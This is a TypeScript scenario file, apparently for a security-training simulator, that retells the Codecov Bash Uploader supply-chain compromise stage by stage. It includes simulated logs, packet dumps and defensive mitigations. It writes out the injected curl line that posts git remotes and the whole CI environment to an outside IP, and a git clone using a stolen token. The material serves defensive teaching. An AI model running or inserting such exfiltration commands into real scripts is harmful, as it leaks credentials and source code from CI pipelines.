import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'codecov-bash-uploader-ci-env-exfil',
    title: 'Codecov Bash Uploader CI/CD Environment Variable Exfiltration',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Attackers extract a Google Cloud Storage credential from Codecov’s Docker image build process and modify the hosted Bash Uploader script (codecov.sh) to silently POST all CI runner environment variables and git remote URLs to an external server.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Collector (178.62.86.114)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Codecov GCS Bucket (codecov.io/bash)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Enterprise CI Runner (curl | bash)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Egress Proxy & SHA-256 Verifier', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Private Git Repos & Cloud Production Keys', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: GCS Bucket Tampering of Hosted codecov.sh Uploader',
        narration:
          'Leveraging a leaked GCS service account key from a Docker image layer, the threat actor modifies line 522 of the hosted bash script at https://codecov.io/bash, appending a single-line curl payload.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'gsutil cp tampered-codecov.sh gs://codecov-bash-uploader/bash',
          'Injected Line: curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true',
        ],
        defenseMitigation:
          'Never pipe remote scripts directly into a shell (`curl | bash`) without verifying cryptographic SHA-256 checksums or PGP signatures in CI pipelines.',
        logs: [
          {
            id: 'codecov-1',
            timestamp: '11:05:14.090',
            source: 'Auth',
            severity: 'critical',
            raw: 'GCS Object Overwrite | Bucket: codecov-bash-uploader | Object: bash | ExpectedSHA256: 325107... | ObservedSHA256: ac8165... | Note: Unverified modification of hosted CI uploader script',
            parsedFields: {
              ModifiedArtifact: 'https://codecov.io/bash',
              HashMismatch: 'Expected 325107... vs Observed ac8165...',
              RootCause: 'Leaked GCS credential in Docker image layer',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Unverified curl | bash Execution & CI Environment Harvesting',
        narration:
          'Thousands of customer CI/CD pipelines execute bash <(curl -s https://codecov.io/bash) at the end of unit test runs, causing the runner shell to evaluate $(git remote -v) and $(env) and transmit the output over HTTP.',
        activeNodes: ['firewall', 'target', 'attacker', 'siem'],
        mitreTactic: 'Collection (T1005 - Data from Local System)',
        technicalCommands: [
          'bash <(curl -s https://codecov.io/bash)',
          'curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true',
        ],
        defenseMitigation:
          'Restrict outbound CI runner network egress to an explicit domain allowlist so arbitrary raw IP connections (such as 178.62.86.114) are blocked and logged.',
        logs: [
          {
            id: 'codecov-2',
            timestamp: '11:06:02.411',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'curl',
            CommandLine: 'curl -sm 0.5 -d "origin https://github.com/corp/payments.git (fetch)<<<<<< ENV AWS_SECRET_ACCESS_KEY=..." http://178.62.86.114/upload/v2',
            raw: 'CI Runner Process Telemetry | Parent: /bin/bash | Command: curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 | DestinationIP: 178.62.86.114',
            parsedFields: {
              ParentScript: 'codecov.sh (Line 522)',
              HarvestedData: 'git remote -v + full process env table',
              ExfilDestination: 'http://178.62.86.114/upload/v2',
              TimeoutFlag: '-sm 0.5 (500ms silent fail-open)',
            },
          },
        ],
        packets: [
          {
            id: 'codecov-pkt-1',
            timestamp: '11:06:02.445',
            protocol: 'HTTP',
            sourceIp: '10.128.0.42',
            destIp: '178.62.86.114',
            port: 80,
            flag: 'PSH-ACK',
            payloadSize: 3420,
            hexDump: '50 4F 53 54 20 2F 75 70 6C 6F 61 64 2F 76 32 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 37 38 2E 36 32 2E 38 36 2E 31 31 34 0D 0A',
            decodedString: 'POST /upload/v2 HTTP/1.1 | Body: origin https://x-access-token:ghp_...@github.com/corp/core.git <<<<<< ENV AWS_ACCESS_KEY_ID=AKIA... GPG_PRIVATE_KEY=...',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Downstream Private Git Repository Cloning & Signing Key Abuse',
        narration:
          'Using the harvested GitHub tokens, GPG signing keys, and cloud credentials from the CI environment dump, the threat actor clones hundreds of private customer source repositories and pivots into production cloud accounts.',
        activeNodes: ['attacker', 'ad', 'siem'],
        mitreTactic: 'Lateral Movement (T1078.004 - Cloud Accounts)',
        technicalCommands: [
          'git clone https://x-access-token:ghp_StolenCiToken@github.com/corp/core-platform.git',
        ],
        defenseMitigation:
          'Scope CI tokens to minimum repository permissions, avoid storing long-lived signing keys in global CI environment variables, and audit unexpected git clone events from non-runner ASNs.',
        logs: [
          {
            id: 'codecov-3',
            timestamp: '14:22:19.772',
            source: 'Auth',
            severity: 'critical',
            raw: 'GitHub Enterprise Audit | Action: git.clone | Actor: ci-bot-account | SourceIP: 104.248.94.23 (Non-Runner ASN) | Repository: corp/core-platform | Status: Success',
            parsedFields: {
              CompromisedIdentity: 'ci-bot-account (Harvested from CI env)',
              SourceIp: '104.248.94.23',
              Action: 'Unauthorized Private Repository Clone',
            },
          },
        ],
        packets: [],
      },
    ],
  };
